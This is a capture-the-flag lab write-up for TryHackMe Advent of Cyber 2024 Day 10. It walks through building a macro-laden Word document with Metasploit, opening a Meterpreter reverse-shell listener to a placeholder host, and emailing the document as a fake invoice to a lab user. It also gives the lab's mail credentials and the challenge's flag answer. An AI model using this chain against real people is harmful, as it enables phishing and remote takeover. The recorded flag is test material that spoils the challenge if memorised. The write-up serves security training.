# 🎄 TryHackMe Advent of Cyber 2024 – Day 10: Phishing and Macro Exploitation

## Objectives 🎯

Day 10 focuses on understanding **phishing attacks** and how malicious macros can be embedded into Microsoft Office documents to execute payloads. The key tasks include:
- Learning how phishing exploits social engineering to bypass security.
- Creating a malicious macro-enabled document using Metasploit.
- Executing a phishing simulation to deliver the malicious document and gain a reverse shell.

## Steps 🚀

### **Step 1: Setting Up the Environment**
1. **Start the Machines:**
   - Click the **Start Machine** button to start the **target machine** attached to this task.
   - Launch the **AttackBox** by clicking the **Start AttackBox** button at the top of the page.
   
2. **Launch Metasploit Framework:**  
   Open the AttackBox terminal and start Metasploit:
   ```
   msfconsole
   ```

3. **Set Payload for Reverse Shell:**  
   Configure the payload:
   ```
   set payload windows/meterpreter/reverse_tcp
   ```

4. **Specify Exploit Module:**  
   Use the module to create a malicious macro:
   ```
   use exploit/multi/fileformat/office_word_macro
   ```

5. **Set Listener Details:**  
   Define the attacker IP (`LHOST`) and port (`LPORT`):
   ```
   set LHOST ATTACKBOX_IP
   set LPORT 8888
   ```

6. **Generate Malicious Document:**  
   Generate the Word document with the embedded macro:
   ```
   exploit
   ```
   The document (`msf.docm`) is saved to `/root/.msf4/local/msf.docm`.

---

### **Step 2: Configuring the Listener**
1. **Start the Listener in Metasploit:**  
   Use the multi-handler module to listen for incoming connections:
   ```
   use multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST ATTACKBOX_IP
   set LPORT 8888
   exploit
   ```

2. **Wait for Connections:**  
   The listener is now ready to capture reverse shells once the document is executed.

### **Step 3: Sending the Malicious Document**
1. **Log In to the Mail Server:**  
   Open Firefox in the AttackBox and navigate to `http://MACHINE_IP`. Use the provided credentials:
   - **Email:** info@socmas.thm  
   - **Password:** MerryPhishMas!

2. **Compose a Phishing Email:**  
   Attach the malicious document (`msf.docm`) and send it to the target:
   - **Recipient:** marta@socmas.thm  
   - Rename the document to something plausible like `invoice.docm`.

3. **Social Engineering Message:**  
   Write a convincing message in the email body to entice the target to open the document.

### **Step 4: Exploitation**
1. **Target Opens the Document:**  
   Once Marta opens the document, the embedded macro executes, establishing a reverse shell connection.

2. **Access the Target System:**  
   In Metasploit, observe the successful connection:
   ```
   msf6 exploit(multi/handler) > exploit
   ```

3. **Navigate to the Desktop:**  
   Use the Meterpreter session to find the `flag.txt`:
   ```
   cd c:/users/Administrator/Desktop
   ls
   cat flag.txt
   ```

4. **Retrieve the Flag:**  
   The flag is displayed.

**Flag:** `THM{PHISHING_PAYLOAD_WIN}`

## Key Findings 🔑

1. **Phishing Attacks:**  
   Social engineering is a highly effective method to bypass technical defenses.
   
2. **Malicious Macros:**  
   Macros in Office documents can be weaponized to execute payloads and gain remote access.

3. **Reverse Shell:**  
   A reverse shell allows attackers to control a compromised system remotely, bypassing firewalls and NAT.

## Lessons Learned 🌟

### Key Takeaways
1. **Human Factor:**  
   Phishing attacks exploit human error, making security awareness training critical.
   
2. **Macro Exploitation:**  
   Embedding malicious macros in commonly used file formats can evade basic defenses.

3. **Phishing Prevention:**  
   - Use domain filtering to block typosquatting domains.
   - Enable email security tools like DKIM and SPF.
   - Educate users to identify phishing attempts.

### Mitigation Strategies
- Disable macros by default in Office applications.
- Monitor outgoing network connections for unusual activity.
- Deploy advanced endpoint protection solutions.

### Tools and Techniques 🛠️
1. **Metasploit Framework:**  
   Used to generate malicious documents and handle reverse shells.
2. **Email Server Simulation:**  
   Sent phishing emails to the target.
3. **Meterpreter:**  
   Exploited the connection to gain control over the target system.

## Final Thoughts 🎁

Day 10 provided hands-on experience with **phishing attacks** and the power of **macro-enabled documents** in social engineering exploits. This task emphasized the importance of user training and technical controls to mitigate phishing risks. The seamless integration of Metasploit made this challenge both informative and practical for real-world scenarios.

### Answers ✅
1. **What is the flag value inside the `flag.txt` file?**  
   **Answer:** `THM{PHISHING_PAYLOAD_WIN}`

## Table of Contents 📚

- [Day 1: OPSEC Challenge](day1.md)  
- [Day 2: Log Analysis](day2.md)  
- [Day 3: Log Analysis](day3.md)  
- [Day 4: Atomic Red Team](day4.md)  
- [Day 5: XXE Exploitation](day5.md)  
- [Day 6: Sandboxes](day6.md)  
- [Day 7: AWS Log Analysis](day7.md)  
- [Day 8: Shellcode Execution](day8.md)  
- [Day 9: Risk Assessment Challenge](day9.md)  
- **Day 10: Phishing**
- [Day 11: Wi-Fi Attacks](day11.md)
- [More Days to Come!](README.md)
